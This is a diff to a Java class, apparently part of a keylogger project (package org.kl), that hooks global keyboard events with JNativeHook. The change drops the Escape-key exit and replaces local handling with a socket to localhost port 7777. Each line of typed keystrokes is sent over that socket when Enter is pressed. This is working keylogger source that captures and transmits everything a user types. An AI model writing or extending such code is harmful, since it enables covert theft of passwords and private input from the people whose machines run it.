@@ -1,6 +1,10 @@
 package org.kl;
 
-import java.io.FileWriter;
+import java.io.IOException;
+import java.io.OutputStreamWriter;
+import java.io.PrintWriter;
+import java.net.Socket;
+import java.net.UnknownHostException;
 
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
@@ -12,32 +16,36 @@ import org.jnativehook.keyboard.NativeKeyEvent;
  */
 public class MyKeyListener implements MyNativeKeyListener {
 	
-    FileWriter out;
-    private DataReader reader;
+    private PrintWriter printer;
+    private Socket socket;
+    private String message = new String(); 
     
     public MyKeyListener() {
-    	reader = new DataReader();
+    	try {
+    	socket = new Socket("localhost", 7777);
+    	printer = new PrintWriter(socket.getOutputStream(), true);
+    	}
+    	catch(UnknownHostException exc1)
+    	{
+    		exc1.printStackTrace();
+    	}
+    	catch(IOException exc2)
+    	{
+    		exc2.printStackTrace();
+    	}
+    	
     }
     
     /* Key Pressed */
     public void nativeKeyPressed(NativeKeyEvent e) {
         System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
-        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
-            try {
-				GlobalScreen.unregisterNativeHook();
-			} catch (NativeHookException e1) {
-				// TODO Auto-generated catch block
-				e1.printStackTrace();
-			}
+        String str = NativeKeyEvent.getKeyText(e.getKeyCode());
+        message = str + message;
+        System.out.println(message);
+        if ((e.getKeyCode() == NativeKeyEvent.VC_ENTER)){
+        	printer.println(message); //What is connection is closed from bullshit data I get?
+        	message = new String();
         }
-        try {
-        	reader.sendKey(NativeKeyEvent.getKeyText(e.getKeyCode()));
-        }
-        catch(InterruptedException ex) {
-        	System.out.println("Interrupted Exception");
-        	ex.printStackTrace();
-        }
-
     }
 
     /* Key Released */
